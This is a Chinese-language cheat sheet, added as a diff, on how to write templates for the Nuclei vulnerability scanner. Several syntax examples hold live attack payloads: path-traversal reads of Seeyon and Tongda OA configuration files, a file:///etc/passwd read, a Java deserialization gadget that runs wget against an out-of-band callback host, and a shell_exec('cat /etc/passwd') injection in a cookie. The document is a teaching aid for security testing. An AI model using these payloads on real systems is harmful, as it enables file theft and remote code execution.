@@ -1,0 +1,168 @@
+官方文档 : https://nuclei.projectdiscovery.io/templating-guide
+
+nuclei 2.9.1 更新把模版格式改变了，后续nuclei版本要大于等于 291 不然可能解析不了模版格式
+- https://github.com/projectdiscovery/nuclei/releases/tag/v2.9.1
+- https://github.com/projectdiscovery/nuclei/issues/3055
+
+----------------------------分割线----------------------------
+
+Get : 发送一个GET请求
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"
+
+----------------------------分割线----------------------------
+
+POST : 发送一个POST请求
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/sys/ui/extend/varkind/custom.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: 'var={"body":{"file":"file:///etc/passwd"}}'
+
+----------------------------分割线----------------------------
+
+RAW : 解析 raw 格式请求
+http:
+  - raw:
+      - |
+        POST /ispirit/interface/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"url":"/general/../../mysql5/my.ini"}
+
+----------------------------分割线----------------------------
+
+stop-at-first-match : 大意就是一个模板里有多个扫描路径,当第一个命中时,自动停止后面几个路径的扫描,当然这个不会影响其他模板.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      - "{{BaseURL}}/login"
+      - "{{BaseURL}}/main"
+      - "{{BaseURL}}/index"
+
+    stop-at-first-match: true
+
+----------------------------分割线----------------------------
+
+OOB : 自 Nuclei v2.3.6 发行以来，Nuclei 支持使用 interact.sh API 内置自动请求关联来实现基于 OOB 的漏洞扫描。
+http:
+  - raw:
+      - |
+        GET /plugins/servlet/oauth/users/icon-uri?consumerUri={{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+
+----------------------------分割线----------------------------
+
+JAVA反序列化 : https://nuclei.projectdiscovery.io/templating-guide/helper-functions/#deserialization-helper-functions
+raw:
+  -  |
+    POST /index.faces;jsessionid=x HTTP/1.1
+    Host: {{Hostname}}
+    Accept-Encoding: gzip, deflate
+    Content-Length: 1882
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+
+    javax.faces.ViewState={{generate_java_gadget("commons-collections3.1", "wget http://{{interactsh-url}}", "base64")}}
+
+----------------------------分割线----------------------------
+
+skip-variables-check : 当你的请求内容里包含 {{ 时,会被 nuclei 解析为变量,加这个就是告诉nuclei不要解析.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      Cookie: "CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl"
+
+    skip-variables-check: true
+
+----------------------------分割线----------------------------
+
+嵌套表达式
+❌ {{url_decode({{base64_decode('SGVsbG8=')}})}}
+✔ {{url_decode(base64_decode('SGVsbG8='))}}
+
+如果需要在 extractor 中使用,比如将 extractor 提取的变量值 test 进行处理
+{{url_decode(base64_decode('{{test}}'))}}
+
+----------------------------分割线----------------------------
+
+自定义模版变量 : 自 2.6.9 版本开始支持
+variables:
+  a1: "{{to_lower(rand_base(5))}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/?test={{a1}}"
+
+    matchers:
+      - type: word
+        words:
+          - "{{a1}}"
+
+----------------------------分割线----------------------------
+
+self-contained : 这个用的比较局限,一般就是用于批量检测 API 可用性的,举个例子,你通过信息泄露获得了一个 API_Key 但你不知道这个是哪个服务的 APIkey,没有特征,那么就只能找哪些官方API接口一个一个试,看哪一个平台可以生效,就是这个意思。
+id: example-self-contained-input
+
+info:
+  name: example-self-contained
+  author: pdteam
+  severity: info
+
+self-contained: true
+http:
+  - raw:
+      - |
+        GET https://example.com:443/gg HTTP/1.1
+        Host: example.com:443
+
+----------------------------分割线----------------------------
+
+文件协议 : 文件模板默认读取的文件大小1GB
+file:
+  - extensions:
+      - all
+
+    extractors:
+      - type: regex
+        regex:
+          - '"type": "service_account"'
+
+----------------------------分割线----------------------------
+
+网络层
+tcp:
+  - host:
+      - '{{Hostname}}'
+      - '{{Host}}:22'
+
+    inputs:
+      - data: "\n"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'SSH\-([0-9.-A-Za-z_ ]+)'
+
+----------------------------分割线----------------------------
+
+读取大小
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/thumbs.db"
+      - "{{BaseURL}}/.svn/wc.db"
+
+    max-size: 500 # Size in bytes - Max Size to read from server response
